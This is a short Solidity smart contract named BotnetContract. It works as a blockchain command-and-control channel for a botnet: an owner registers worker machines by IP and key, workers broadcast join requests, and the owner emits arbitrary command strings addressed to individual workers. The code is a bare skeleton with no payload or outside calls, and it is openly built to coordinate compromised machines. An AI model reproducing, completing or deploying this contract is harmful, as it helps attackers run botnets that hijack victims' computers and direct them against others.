// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

contract BotnetContract {

    address public owner;
    //string public ownerPubKey;

    //state?
    struct Worker {
        string ip;
        string key;
    }

    mapping (string => Worker) public stringToWorker;
    Worker[] public workers;


    event joinRequest(string workerKey, string workerIP);

    event commandAdded(string workerKey, string cmd, uint32 cmdID);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);  
        _;
    }

    function addWorker(string memory workerKey, string memory workerIP) onlyOwner public {
        //check mapping
        workers.push(Worker({ip: workerIP, key: workerKey}));
        stringToWorker[workerKey] = Worker({ip: workerIP, key: workerKey});
    }

    function addCommand(string memory workerKey, string memory cmd, uint32 cmdID) onlyOwner public {
        emit commandAdded(workerKey, cmd, cmdID);
    }

    function join(string memory workerKey, string memory workerIP) public{
        emit joinRequest(workerKey, workerIP);
    }
    
}